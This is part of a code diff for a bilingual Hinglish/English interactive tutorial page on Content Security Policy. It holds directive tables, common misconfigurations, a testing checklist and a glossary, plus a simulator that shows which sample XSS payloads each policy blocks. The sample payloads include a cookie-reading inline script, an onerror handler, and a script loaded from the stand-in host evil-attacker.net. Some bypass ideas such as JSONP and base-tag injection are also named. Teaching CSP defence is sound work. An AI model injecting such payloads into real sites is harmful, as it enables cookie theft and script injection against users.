+        def:"<span class='lang-hi'>Sirf specific INLINE EVENT HANDLERS (jaise onclick) ko allow karta hai agar unka hash match ho — 'unsafe-inline' se zyada narrow/controlled option hai.</span><span class='lang-en'>Allows specific INLINE EVENT HANDLERS (like onclick) only if their hash matches — a narrower/controlled alternative to 'unsafe-inline'.</span>", 
+        ex:"script-src 'self' 'unsafe-hashes' 'sha256-abc...=';" },
+      { name:"'strict-dynamic'", danger:false, 
+        def:"<span class='lang-hi'>Modern approach: agar ek trusted script (jo nonce/hash se verify hua hai) khud koi aur script load karta hai, to woh bhi automatically trusted maana jaata hai — bina use explicitly whitelist kiye. Allowlist maintain karna aasan ho jaata hai.</span><span class='lang-en'>Modern approach: if a trusted script (verified via nonce/hash) loads another script itself, that script is automatically considered trusted — without explicitly whitelisting it. Makes maintaining the allowlist easier.</span>", 
+        ex:"script-src 'nonce-xyz' 'strict-dynamic';" }
+    ]
+  },
+  {
+    group: "<span class='lang-hi'>Hosts & Schemes</span><span class='lang-en'>Hosts & Schemes</span>",
+    items: [
+      { name:"Specific domain", danger:false, 
+        def:"<span class='lang-hi'>Exact domain likh sakte ho — sirf yehi exact source allowed hoga.</span><span class='lang-en'>You can write the exact domain — only this exact source will be allowed.</span>", 
+        ex:"script-src https://cdn.example.com;" },
+      { name:"Wildcard subdomain", danger:false, 
+        def:"<span class='lang-hi'>*.example.com format likhne se koi bhi subdomain (jaise api.example.com, cdn.example.com) allowed ho jata hai.</span><span class='lang-en'>Writing in *.example.com format allows any subdomain (like api.example.com, cdn.example.com).</span>", 
+        ex:"script-src *.example.com;" },
+      { name:"Scheme-based", danger:false, 
+        def:"<span class='lang-hi'>https: likhne se HTTPS wala koi bhi source allowed ho jata hai (bohot broad hai, careful use karo). data: aur blob: bhi scheme values hain, jo data-URIs allow karte hain.</span><span class='lang-en'>Writing https: allows any source over HTTPS (very broad, use carefully). data: and blob: are also scheme values that allow data-URIs.</span>", 
+        ex:"img-src 'self' data:;" },
+      { name:"Wildcard *", danger:true, 
+        def:"<span class='lang-hi'>Sabse loose option — literally kahin se bhi allow kar deta hai. Isse directive ka protection almost khatam ho jata hai (attacker apna payload kahin bhi host karke load karwa sakta hai). NOTE: yeh 'unsafe-inline' ko IMPLY nahi karta — inline scripts phir bhi blocked rehte hain.</span><span class='lang-en'>The loosest option — literally allows from anywhere. This almost eliminates the directive's protection (an attacker can host and load their payload from anywhere). NOTE: this does NOT imply 'unsafe-inline' — inline scripts remain blocked.</span>", 
+        ex:"script-src *;" }
+    ]
+  },
+  {
+    group: "<span class='lang-hi'>Nonce & Hash (Modern Approach)</span><span class='lang-en'>Nonce & Hash (Modern Approach)</span>",
+    items: [
+      { name:"Nonce", danger:false, 
+        def:"<span class='lang-hi'>Server har response pe ek RANDOM token generate karta hai, use CSP header mein bhi daalta hai aur specific script tag mein bhi (nonce attribute). Attacker ko yeh random value pata nahi hoti, isliye uska injected script block ho jaata hai — bina 'unsafe-inline' use kiye specific scripts allow karne ka safe tarika. Nonce HAR response pe naya/random hona chahiye, reuse nahi karna chahiye.</span><span class='lang-en'>The server generates a RANDOM token on every response, puts it in the CSP header and in the specific script tag (nonce attribute). The attacker doesn't know this random value, so their injected script gets blocked — a safe way to allow specific scripts without using 'unsafe-inline'. Nonces must be newly generated/random on EVERY response, never reused.</span>", 
+        ex:"Header: script-src 'nonce-r4nd0m123';\nHTML: <script nonce=\"r4nd0m123\">...<\/script>" },
+      { name:"Hash", danger:false, 
+        def:"<span class='lang-hi'>Browser inline script ke exact content ka SHA hash calculate karta hai aur sirf tabhi allow karta hai jab woh hash policy mein already listed ho. STATIC (fixed, kabhi na badalne wale) inline scripts ke liye achha hai — dynamic content ke liye har baar naya hash chahiye hoga, isliye practical nahi.</span><span class='lang-en'>The browser calculates the SHA hash of the inline script's exact content and only allows it if that hash is already listed in the policy. Great for STATIC (fixed, unchanging) inline scripts — dynamic content would need a new hash every time, making it impractical.</span>", 
+        ex:"script-src 'sha256-abc123...=';" }
+    ]
+  }
+];
+
+var simConfigs = [
+  { id:"none", label:"CSP Nahi Laga", sub:"<span class='lang-hi'>Default (No Header)</span><span class='lang-en'>Default (No Header)</span>", header:"(No Content-Security-Policy header sent)" },
+  { id:"self", label:"script-src 'self'", sub:"<span class='lang-hi'>Strict</span><span class='lang-en'>Strict</span>", header:"Content-Security-Policy: script-src 'self';" },
+  { id:"selfinline", label:"script-src 'self' 'unsafe-inline'", sub:"<span class='lang-hi'>Weak</span><span class='lang-en'>Weak</span>", header:"Content-Security-Policy: script-src 'self' 'unsafe-inline';" },
+  { id:"trustedcdn", label:"script-src 'self' trusted-cdn.com", sub:"<span class='lang-hi'>Host Allowlist</span><span class='lang-en'>Host Allowlist</span>", header:"Content-Security-Policy: script-src 'self' https://trusted-cdn.com;" },
+  { id:"wildcard", label:"script-src *", sub:"<span class='lang-hi'>Misconfigured</span><span class='lang-en'>Misconfigured</span>", header:"Content-Security-Policy: script-src *;" },
+  { id:"nonce", label:"script-src 'nonce-r4nd0m123'", sub:"<span class='lang-hi'>Modern / Strict</span><span class='lang-en'>Modern / Strict</span>", header:"Content-Security-Policy: script-src 'nonce-r4nd0m123';" }
+];
+
+var simPayloads = [
+  { id:"inline", label:"Inline <script> Injection", code:"<script>alert('Hacked! Cookie: '+document.cookie)<\/script>" },
+  { id:"handler", label:"Inline Event Handler (onerror)", code:'<img src=x onerror="alert(\'Hacked via onerror!\')">' },
+  { id:"external", label:"External Script (attacker domain)", code:'<script src="https://evil-attacker.net/payload.js"><\/script>' }
+];
+
+var simResults = {
+  none: {
+    inline:{blocked:false, reason:"<span class='lang-hi'>Koi CSP header hi nahi hai, isliye browser SAB KUCH allow kar deta hai — inline script bina roktok chal jaata hai.</span><span class='lang-en'>No CSP header is present, so the browser allows EVERYTHING — the inline script runs without restriction.</span>"},
+    handler:{blocked:false, reason:"<span class='lang-hi'>CSP na hone se event handler bhi normally execute ho jaata hai.</span><span class='lang-en'>Without CSP, the event handler also executes normally.</span>"},
+    external:{blocked:false, reason:"<span class='lang-hi'>Koi restriction na hone se attacker ke domain se script bhi load ho jaata hai.</span><span class='lang-en'>With no restrictions, the script from the attacker's domain is also loaded.</span>"}
+  },
+  self: {
+    inline:{blocked:true, reason:"<span class='lang-hi'>'unsafe-inline' nahi hai, isliye koi bhi inline script (bina nonce/hash ke) BLOCK ho jaata hai — chahe legitimate ho ya attacker ka.</span><span class='lang-en'>'unsafe-inline' is missing, so any inline script (without nonce/hash) is BLOCKED — whether legitimate or the attacker's.</span>"},
+    handler:{blocked:true, reason:"<span class='lang-hi'>Event handlers (onerror, onclick) bhi 'unsafe-inline' ke bina blocked hote hain — CSP inhe bhi 'inline execution' hi maanta hai.</span><span class='lang-en'>Event handlers (onerror, onclick) are also blocked without 'unsafe-inline' — CSP considers them 'inline execution' too.</span>"},
+    external:{blocked:true, reason:"<span class='lang-hi'>evil-attacker.net allowlist mein nahi hai (sirf 'self' allowed hai), isliye external script load hi nahi hota.</span><span class='lang-en'>evil-attacker.net is not in the allowlist (only 'self' is allowed), so the external script is not loaded.</span>"}
+  },
+  selfinline: {
+    inline:{blocked:false, reason:"<span class='lang-hi'>'unsafe-inline' present hai, isliye yeh inline script bhi execute ho jaata hai — attacker ka payload safal!</span><span class='lang-en'>'unsafe-inline' is present, so this inline script executes — the attacker's payload is successful!</span>"},
+    handler:{blocked:false, reason:"<span class='lang-hi'>'unsafe-inline' event handlers ko bhi cover karta hai, isliye onerror bhi chal jaata hai.</span><span class='lang-en'>'unsafe-inline' also covers event handlers, so onerror executes as well.</span>"},
+    external:{blocked:true, reason:"<span class='lang-hi'>'unsafe-inline' sirf INLINE content allow karta hai — external domain (evil-attacker.net) allowlist mein nahi hai, isliye yeh phir bhi blocked hai.</span><span class='lang-en'>'unsafe-inline' only allows INLINE content — the external domain (evil-attacker.net) is not in the allowlist, so it remains blocked.</span>"}
+  },
+  trustedcdn: {
+    inline:{blocked:true, reason:"<span class='lang-hi'>'unsafe-inline' nahi hai, to inline script blocked hai.</span><span class='lang-en'>'unsafe-inline' is missing, so the inline script is blocked.</span>"},
+    handler:{blocked:true, reason:"<span class='lang-hi'>Event handler bhi 'unsafe-inline' ke bina blocked hai.</span><span class='lang-en'>The event handler is also blocked without 'unsafe-inline'.</span>"},
+    external:{blocked:true, reason:"<span class='lang-hi'>Policy mein sirf 'self' aur trusted-cdn.com allowed hain — evil-attacker.net alag domain hai, isliye blocked.</span><span class='lang-en'>The policy only allows 'self' and trusted-cdn.com — evil-attacker.net is a different domain, so it's blocked.</span>"}
+  },
+  wildcard: {
+    inline:{blocked:true, reason:"<span class='lang-hi'>IMPORTANT: '*' sirf HOST-based sources ko match karta hai — yeh 'unsafe-inline' ko IMPLY nahi karta. Isliye inline script phir bhi blocked hai!</span><span class='lang-en'>IMPORTANT: '*' only matches HOST-based sources — it does NOT IMPLY 'unsafe-inline'. Therefore, the inline script remains blocked!</span>"},
+    handler:{blocked:true, reason:"<span class='lang-hi'>Wildcard (*) event handlers ko bhi allow nahi karta — inline execution ke liye alag se 'unsafe-inline' chahiye hota hai.</span><span class='lang-en'>The wildcard (*) does not allow event handlers either — inline execution separately requires 'unsafe-inline'.</span>"},
+    external:{blocked:false, reason:"<span class='lang-hi'>'*' ka matlab hai KISI BHI domain se script allowed hai — isliye attacker ka evil-attacker.net bhi load ho jaata hai!</span><span class='lang-en'>'*' means scripts are allowed from ANY domain — so the attacker's evil-attacker.net is loaded!</span>"}
+  },
+  nonce: {
+    inline:{blocked:true, reason:"<span class='lang-hi'>Attacker ke script tag mein sahi NONCE nahi hai (attacker ko random nonce pata nahi hota), isliye blocked.</span><span class='lang-en'>The attacker's script tag lacks the correct NONCE (the attacker doesn't know the random nonce), so it is blocked.</span>"},
+    handler:{blocked:true, reason:"<span class='lang-hi'>Nonce sirf script tags ko cover karta hai, event handlers ko nahi — yahan bhi 'unsafe-inline' na hone se yeh already blocked hai.</span><span class='lang-en'>Nonce only covers script tags, not event handlers — without 'unsafe-inline' here, it is already blocked.</span>"},
+    external:{blocked:true, reason:"<span class='lang-hi'>Nonce-only policy mein koi host explicitly allowed nahi hai, isliye external domain bhi blocked hai.</span><span class='lang-en'>In a nonce-only policy, no host is explicitly allowed, so the external domain is also blocked.</span>"}
+  }
+};
+
+var misconfigs = [
+  { title:"<span class='lang-hi'>'unsafe-inline' script-src mein present hai</span><span class='lang-en'>'unsafe-inline' is present in script-src</span>", 
+    desc:"<span class='lang-hi'>Sabse common galti — isse XSS protection ka zyada tar fayda khatam ho jaata hai, kyunki attacker ka injected inline script bhi normally chal jaata hai.</span><span class='lang-en'>The most common mistake — this negates most of the XSS protection benefit, as the attacker's injected inline script runs normally.</span>" },
+  { title:"<span class='lang-hi'>script-src * ya bohot broad wildcard</span><span class='lang-en'>script-src * or a very broad wildcard</span>", 
+    desc:"<span class='lang-hi'>Attacker kahin se bhi apna payload host karke usse load karwa sakta hai — allowlist ka koi matlab nahi reh jaata.</span><span class='lang-en'>An attacker can host their payload anywhere and load it — rendering the allowlist meaningless.</span>" },
+  { title:"<span class='lang-hi'>object-src missing ya 'none' nahi hai</span><span class='lang-en'>object-src is missing or not 'none'</span>", 
+    desc:"<span class='lang-hi'>Legacy plugin-based attack vectors (jaise Flash) khule reh jaate hain.</span><span class='lang-en'>Legacy plugin-based attack vectors (like Flash) remain open.</span>" },
+  { title:"<span class='lang-hi'>base-uri missing hai</span><span class='lang-en'>base-uri is missing</span>", 
+    desc:"<span class='lang-hi'>Attacker base tag inject karke page ke saare relative URLs ko apne domain pe hijack kar sakta hai.</span><span class='lang-en'>An attacker can inject a base tag and hijack all relative URLs on the page to point to their domain.</span>" },
+  { title:"<span class='lang-hi'>Whitelisted domain pe JSONP endpoint hona</span><span class='lang-en'>JSONP endpoint on a whitelisted domain</span>", 
+    desc:"<span class='lang-hi'>Classic bypass technique — agar ek trusted CDN/domain pe JSONP callback endpoint hai, attacker uska use karke apna script 'trusted' source se load karwa sakta hai.</span><span class='lang-en'>Classic bypass technique — if a trusted CDN/domain has a JSONP callback endpoint, an attacker can use it to load their script from a 'trusted' source.</span>" },
+  { title:"<span class='lang-hi'>Report-Only header production mein enforce ki jagah use ho raha hai</span><span class='lang-en'>Report-Only header used in production instead of enforce</span>", 
+    desc:"<span class='lang-hi'>Content-Security-Policy-Report-Only kuch bhi actually block nahi karta, sirf report karta hai — isse false sense of security ban jaata hai.</span><span class='lang-en'>Content-Security-Policy-Report-Only doesn't actually block anything, it only reports — creating a false sense of security.</span>" },
+  { title:"<span class='lang-hi'>Same directive do baar specify karna</span><span class='lang-en'>Specifying the same directive twice</span>", 
+    desc:"<span class='lang-hi'>Sirf PEHLI wali count hoti hai, doosri silently ignore ho jaati hai — developer sochta hai fix ho gaya, lekin nahi hua.</span><span class='lang-en'>Only the FIRST one counts, the second is silently ignored — the developer thinks it's fixed, but it isn't.</span>" },
+  { title:"<span class='lang-hi'>default-src loose chhod diya, sirf script-src tighten kiya</span><span class='lang-en'>default-src left loose, only script-src tightened</span>", 
+    desc:"<span class='lang-hi'>default-src sirf FETCH directives ke liye fallback deta hai — connect-src, frame-src jaise directives agar explicitly set nahi hain, woh loose default-src follow karenge.</span><span class='lang-en'>default-src only provides a fallback for FETCH directives — if connect-src, frame-src aren't explicitly set, they will follow the loose default-src.</span>" },
+  { title:"<span class='lang-hi'>CSP sirf ek page pe apply hai, baaki pe nahi</span><span class='lang-en'>CSP applied only on one page, not on others</span>", 
+    desc:"<span class='lang-hi'>Aksar sirf login page pe CSP milta hai, baaki application pages pe nahi — inconsistent protection, tester ko har page/route check karna chahiye.</span><span class='lang-en'>Often CSP is only found on the login page, not on other application pages — inconsistent protection, testers must check every page/route.</span>" }
+];
+
+var checklistItems = [
+  "<span class='lang-hi'>CSP header hai bhi ya nahi? (kai sites mein bilkul hota hi nahi)</span><span class='lang-en'>Is there a CSP header at all? (many sites don't have it)</span>",
+  "<span class='lang-hi'>Enforcing header hai (Content-Security-Policy) ya sirf Report-Only?</span><span class='lang-en'>Is it an enforcing header (Content-Security-Policy) or just Report-Only?</span>",
+  "<span class='lang-hi'>default-src restrictive hai (missing ya * to nahi hai)?</span><span class='lang-en'>Is default-src restrictive (not missing or *)?</span>",
+  "<span class='lang-hi'>script-src mein 'unsafe-inline'/'unsafe-eval' avoid kiya gaya hai?</span><span class='lang-en'>Are 'unsafe-inline'/'unsafe-eval' avoided in script-src?</span>",
+  "<span class='lang-hi'>Inline scripts allow karne ke liye nonce ya hash strategy use ho rahi hai?</span><span class='lang-en'>Is a nonce or hash strategy being used to allow inline scripts?</span>",
+  "<span class='lang-hi'>object-src 'none' set hai?</span><span class='lang-en'>Is object-src set to 'none'?</span>",
+  "<span class='lang-hi'>base-uri restricted hai ('self' ya 'none')?</span><span class='lang-en'>Is base-uri restricted ('self' or 'none')?</span>",
+  "<span class='lang-hi'>frame-ancestors sahi se set hai (clickjacking defense ke liye)?</span><span class='lang-en'>Is frame-ancestors set properly (for clickjacking defense)?</span>",
+  "<span class='lang-hi'>Whitelisted domains legitimate/controlled hain (koi risky JSONP-bypassable CDN to nahi)?</span><span class='lang-en'>Are whitelisted domains legitimate/controlled (no risky JSONP-bypassable CDNs)?</span>",
+  "<span class='lang-hi'>form-action restricted hai?</span><span class='lang-en'>Is form-action restricted?</span>",
+  "<span class='lang-hi'>Reporting (report-uri/report-to) configured hai production visibility ke liye?</span><span class='lang-en'>Is reporting (report-uri/report-to) configured for production visibility?</span>",
+  "<span class='lang-hi'>CSP saare pages/routes pe consistently apply ho raha hai, sirf ek page pe nahi?</span><span class='lang-en'>Is CSP consistently applied across all pages/routes, not just one?</span>",
+  "<span class='lang-hi'>Known bypass payloads (JSONP tricks, whitelisted-domain-specific bypasses) try kiye gaye hain?</span><span class='lang-en'>Have known bypass payloads (JSONP tricks, whitelisted-domain-specific bypasses) been tried?</span>",
+  "<span class='lang-hi'>Browser DevTools console check kiya gaya hai existing violations ke liye normal browsing ke dauraan?</span><span class='lang-en'>Has the Browser DevTools console been checked for existing violations during normal browsing?</span>"
+];
+
+var summaryData = [
+  ["default-src","Fetch","<span class='lang-hi'>Baaki sabhi fetch directives ke liye fallback rule</span><span class='lang-en'>Fallback for other fetch directives</span>"],
+  ["script-src","Fetch","<span class='lang-hi'>JS files, inline scripts, event handlers ko control karta hai</span><span class='lang-en'>Controls JS files, inline scripts, event handlers</span>"],
+  ["style-src","Fetch","<span class='lang-hi'>CSS files aur inline styles</span><span class='lang-en'>CSS files, inline styles</span>"],
+  ["img-src","Fetch","<span class='lang-hi'>Images load hone ki permissions</span><span class='lang-en'>Image loading permissions</span>"],
+  ["connect-src","Fetch","<span class='lang-hi'>fetch/XHR/WebSocket network calls kahan ja sakte hain</span><span class='lang-en'>Where fetch/XHR/WebSocket destinations can go</span>"],
+  ["font-src","Fetch","<span class='lang-hi'>Custom fonts ki loading permissions</span><span class='lang-en'>Custom fonts loading permissions</span>"],
+  ["object-src","Fetch","<span class='lang-hi'>object/embed/applet tags (aksar 'none')</span><span class='lang-en'>object/embed/applet (usually 'none')</span>"],
+  ["media-src","Fetch","<span class='lang-hi'>Audio/video tags ki loading permissions</span><span class='lang-en'>Audio/video loading permissions</span>"],
+  ["frame-src","Fetch","<span class='lang-hi'>Nested iframes ke andar kya load ho sakta hai</span><span class='lang-en'>What can load inside nested iframes</span>"],
+  ["worker-src","Fetch","<span class='lang-hi'>Web/Service Workers ki loading permissions</span><span class='lang-en'>Web/Service Workers permissions</span>"],
+  ["manifest-src","Fetch","<span class='lang-hi'>Web app manifest loading permissions</span><span class='lang-en'>Web app manifest permissions</span>"],
+  ["base-uri","Document","<span class='lang-hi'>base tag URL restriction</span><span class='lang-en'>base tag URL restriction</span>"],
+  ["sandbox","Document","<span class='lang-hi'>iframe-jaisi sandbox restrictions apply karna</span><span class='lang-en'>Applies iframe-like sandbox restrictions</span>"],
+  ["form-action","Navigation","<span class='lang-hi'>Form submit destinations</span><span class='lang-en'>Form submit destinations</span>"],
+  ["frame-ancestors","Navigation","<span class='lang-hi'>Kaun is page ko iframe kar sakta hai (clickjacking defense)</span><span class='lang-en'>Who can iframe this page (clickjacking)</span>"],
+  ["report-uri","Reporting","<span class='lang-hi'>Violation reports destination (deprecated)</span><span class='lang-en'>Violation reports destination (deprecated)</span>"],
+  ["report-to","Reporting","<span class='lang-hi'>Violation reports destination (modern)</span><span class='lang-en'>Violation reports destination (modern)</span>"],
+  ["upgrade-insecure-requests","Other","<span class='lang-hi'>Auto-upgrade HTTP to HTTPS</span><span class='lang-en'>Auto-upgrade HTTP to HTTPS</span>"],
+  ["require-trusted-types-for","Other","<span class='lang-hi'>Force Trusted Types API (advanced)</span><span class='lang-en'>Force Trusted Types API (advanced)</span>"]
+];
+
+var glossaryItems = [
+  { term:"HTTP Header", def:"<span class='lang-hi'>Server se browser ko bheja gaya extra metadata, jo actual content ke saath jaata hai.</span><span class='lang-en'>Extra metadata sent by the server to the browser, which goes along with the actual content.</span>" },
+  { term:"Directive", def:"<span class='lang-hi'>CSP header ke andar ek instruction, jaise script-src — ek specific resource type ko control karta hai.</span><span class='lang-en'>An instruction inside the CSP header, like script-src — controls a specific resource type.</span>" },
+  { term:"Source / Source List", def:"<span class='lang-hi'>Directive ke baad likhi hui allowed values ki list — batati hai 'kahan se' allowed hai.</span><span class='lang-en'>The list of allowed values written after a directive — tells 'from where' it is allowed.</span>" },
+  { term:"Origin", def:"<span class='lang-hi'>Scheme + host + port ka combination, jaise https://example.com:443 — do URLs same-origin tabhi hain jab teeno match karein.</span><span class='lang-en'>The combination of scheme + host + port, like https://example.com:443 — two URLs are same-origin only if all three match.</span>" },
+  { term:"Inline Script", def:"<span class='lang-hi'>Ek script tag jo directly HTML file ke andar likha ho, kisi external .js file se load na ho raha ho.</span><span class='lang-en'>A script tag written directly inside the HTML file, not loaded from an external .js file.</span>" },
+  { term:"XSS (Cross-Site Scripting)", def:"<span class='lang-hi'>Ek attack jisme attacker apna malicious script kisi trusted website ke through victim ke browser mein chala deta hai.</span><span class='lang-en'>An attack where an attacker runs their malicious script in the victim's browser through a trusted website.</span>" },
+  { term:"Nonce", def:"<span class='lang-hi'>Ek random, ek-baar-use-hone-wala token jo server generate karta hai, specific inline script ko verify karne ke liye.</span><span class='lang-en'>A random, one-time-use token generated by the server to verify a specific inline script.</span>" },
+  { term:"Hash", def:"<span class='lang-hi'>Kisi content (jaise script) ka fixed-length fingerprint — content thoda sa bhi badle to hash bilkul alag ho jaata hai.</span><span class='lang-en'>A fixed-length fingerprint of content (like a script) — if the content changes even slightly, the hash becomes completely different.</span>" },
+  { term:"Browser Enforcement", def:"<span class='lang-hi'>CSP ko actually apply karne, check karne, aur block karne ka kaam — yeh server nahi, browser khud karta hai.</span><span class='lang-en'>The job of actually applying, checking, and blocking via CSP — this is done by the browser itself, not the server.</span>" },
+  { term:"Violation Report", def:"<span class='lang-hi'>Jab CSP kuch block karta hai, browser ek JSON report bana sakta hai jisme details hoti hain ki kya block hua aur kyun — report-uri/report-to pe bheja jaata hai.</span><span class='lang-en'>When CSP blocks something, the browser can generate a JSON report with details of what was blocked and why — sent to report-uri/report-to.</span>" },
+  { term:"Clickjacking", def:"<span class='lang-hi'>Ek attack jisme attacker aapki site ko invisible iframe mein load karke user ko trick karta hai click karne ke liye, bina unhe pata chale.</span><span class='lang-en'>An attack where an attacker loads your site in an invisible iframe to trick the user into clicking, without them knowing.</span>" }
+];
+
+
+// =====================================================================
+// RENDER HELPERS
+// =====================================================================
+function esc(str){
+  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function renderDirectives(){
+  const container = document.getElementById('directivesContainer');
+  container.innerHTML = directiveGroups.map(g => `
+    <div class="group-block">
+      <div class="group-head">
+        <div class="group-title">${g.group} <span class="count">${g.items.length}</span></div>
+        <p class="group-desc">${g.desc}</p>
+      </div>
+      <div class="card-grid">
+        ${g.items.map(d => `
+          <div class="card">
+            <div class="card-top">
+              <span class="card-title">${esc(d.name)}</span>
+              ${d.tag ? `<span class="card-tag ${d.tagType||'tag-neutral'}">${esc(d.tag)}</span>` : ''}
+            </div>
+            <p class="card-def">${d.def}</p>
+            <pre class="code-block"><code>${esc(d.ex)}</code></pre>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `).join('');
+}
+
+function renderValues(){
+  const container = document.getElementById('valuesContainer');
+  container.innerHTML = valueGroups.map(g => `
+    <div class="group-block">
+      <div class="group-head">
+        <div class="group-title">${g.group} <span class="count">${g.items.length}</span></div>
+      </div>
+      <div class="value-grid">
+        ${g.items.map(v => `
+          <div class="value-card">
+            <div class="value-head">
+              <span class="value-name">${esc(v.name)}</span>
+              ${v.danger ? '<span class="value-badge danger">Risky</span>' : ''}
+            </div>
+            <p class="value-def">${v.def}</p>
+            <pre class="code-block"><code>${esc(v.ex)}</code></pre>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `).join('');
+}
+
+function renderMisconfigs(){
+  const list = document.getElementById('misconfigList');
+  list.innerHTML = misconfigs.map((m,i) => `
+    <div class="misconfig-item">
+      <div class="misconfig-num">${String(i+1).padStart(2,'0')}</div>
+      <div>
+        <div class="misconfig-title">${m.title}</div>
+        <div class="misconfig-desc">${m.desc}</div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function renderChecklist(){
+  const container = document.getElementById('checklistContainer');
+  container.innerHTML = checklistItems.map((text,i) => `
+    <div class="checklist-item" data-idx="${i}">
+      <div class="checklist-box">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#0A0E17" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      </div>
+      <div class="checklist-text">${text}</div>
+    </div>
+  `).join('');
+
+  container.querySelectorAll('.checklist-item').forEach(item => {
+    item.addEventListener('click', () => {
+      item.classList.toggle('checked');
+      updateProgress();
+    });
+  });
+}
+
+function updateProgress(){
+  const total = checklistItems.length;
+  const checked = document.querySelectorAll('.checklist-item.checked').length;
+  document.getElementById('progressText').textContent = `${checked} / ${total} checked`;
+  document.getElementById('progressFill').style.width = `${(checked/total)*100}%`;
+}
+
+function renderSummaryTable(){
+  const body = document.getElementById('summaryTableBody');
+  body.innerHTML = summaryData.map(row => `
+    <tr><td>${esc(row[0])}</td><td>${row[1]}</td><td>${row[2]}</td></tr>
+  `).join('');
+}
+
+function renderGlossary(){
+  const container = document.getElementById('glossaryContainer');
+  container.innerHTML = glossaryItems.map(g => `
+    <div class="glossary-item">
+      <div class="glossary-term">${esc(g.term)}</div>
+      <div class="glossary-def">${g.def}</div>
+    </div>
+  `).join('');
+}
+
+// =====================================================================
+// SIMULATOR LOGIC
+// =====================================================================
+let selectedConfig = null;
+
+function renderConfigGrid(){
+  const grid = document.getElementById('configGrid');
+  grid.innerHTML = simConfigs.map(c => `
+    <button class="config-pill" data-id="${c.id}">
+      <span class="pill-label">${c.sub}</span>${esc(c.label)}
+    </button>
+  `).join('');
+
+  grid.querySelectorAll('.config-pill').forEach(pill => {
+    pill.addEventListener('click', () => {
+      grid.querySelectorAll('.config-pill').forEach(p => p.classList.remove('selected'));
+      pill.classList.add('selected');
+      selectedConfig = pill.dataset.id;
+    });
+  });
+
+  // default select first meaningful config
+  grid.querySelector('[data-id="self"]').classList.add('selected');
+  selectedConfig = 'self';
+}
+
+function runSimulation(){
+  if(!selectedConfig) return;
+  const cfg = simConfigs.find(c => c.id === selectedConfig);
+  const results = simResults[selectedConfig];
+  const panel = document.getElementById('consolePanel');
+
+  let executedCount = 0;
+  const lines = simPayloads.map(p => {
+    const r = results[p.id];
+    if(!r.blocked) executedCount++;
+    const statusClass = r.blocked ? 'is-blocked' : 'is-executed';
+    const icon = r.blocked ? '🛡️' : '💥';
+    const msg = r.blocked
+      ? `<span class='lang-hi'>Refused to execute — violates Content-Security-Policy directive</span><span class='lang-en'>Refused to execute — violates Content-Security-Policy directive</span>`
+      : `<span class='lang-hi'>EXECUTED — payload ran in the browser</span><span class='lang-en'>EXECUTED — payload ran in the browser</span>`;
+    return `
+      <div class="console-line ${statusClass}">
+        <div class="console-icon">${icon}</div>
+        <div>
+          <div class="console-payload-name">${esc(p.label)}</div>
+          <div class="console-msg" style="font-size:11.5px;opacity:0.75;">${esc(p.code)}</div>
+          <div class="console-msg">${msg}</div>
+          <div class="console-reason">${r.reason}</div>
+        </div>
+      </div>
+    `;
+  }).join('');
+
+  let verdictClass = 'safe';
+  let verdictText = `<span class='lang-hi'>✓ Is config ne teeno attack payloads block kar diye — script-src ke liye strong policy.</span><span class='lang-en'>✓ This config blocked all three attack payloads — strong policy for script-src.</span>`;
+  if(executedCount === 3){
+    verdictClass = 'compromised';
+    verdictText = `<span class='lang-hi'>✕ Is config mein CSP ka koi fayda nahi ho raha — saare payloads execute ho gaye.</span><span class='lang-en'>✕ CSP is totally ineffective in this config — all payloads executed.</span>`;
+  } else if(executedCount > 0){
+    verdictClass = 'partial';
+    verdictText = `<span class='lang-hi'>⚠ Partial protection — ${executedCount} payload(s) execute ho gaye, ${3-executedCount} block hue. Nuance samajhna zaroori hai.</span><span class='lang-en'>⚠ Partial protection — ${executedCount} payload(s) executed, ${3-executedCount} blocked. Understanding the nuance is necessary.</span>`;
+  }
+
+  panel.innerHTML = `
+    <div class="code-label" style="margin-bottom:12px;">${esc(cfg.header)}</div>
+    ${lines}
+    <div class="sim-verdict ${verdictClass}">${verdictText}</div>
+  `;
+}
+
+document.getElementById('testBtn').addEventListener('click', runSimulation);
+
+// =====================================================================
+// NAV SCROLL SPY
+// =====================================================================
+function setupScrollSpy(){
+  const sections = document.querySelectorAll('main section[id]');
+  const dots = document.querySelectorAll('.progress-dot');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if(entry.isIntersecting){
+        const id = entry.target.getAttribute('id');
+        dots.forEach(dot => {
+          dot.classList.toggle('done', dot.getAttribute('data-anchor') === id);
+        });
+      }
+    });
+  }, { rootMargin: '-40% 0px -50% 0px' });
+  sections.forEach(s => observer.observe(s));
+  
+  dots.forEach(dot => {
+    dot.addEventListener('click', () => {
+      const anchor = dot.getAttribute('data-anchor');
+      const el = document.getElementById(anchor);
+      if(el) el.scrollIntoView({behavior: 'smooth', block: 'start'});
+    });
+  });
+}
+
+// =====================================================================
+// REVEAL ON SCROLL
+// =====================================================================
+function setupReveal(){
+  const items = document.querySelectorAll('.reveal');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if(entry.isIntersecting){
+        entry.target.classList.add('in');
+        observer.unobserve(entry.target);
+      }
+    });
+  }, { threshold: 0.08 });
+  items.forEach(i => observer.observe(i));
+}
+
+// =====================================================================
+// INIT
+// =====================================================================
+document.addEventListener('DOMContentLoaded', () => {
+  renderDirectives();
+  renderValues();
+  renderMisconfigs();
+  renderChecklist();
+  renderSummaryTable();
+  renderGlossary();
+  renderConfigGrid();
+  setupScrollSpy();
+  setupReveal();
+});
+</script>
+</body>
+</html>
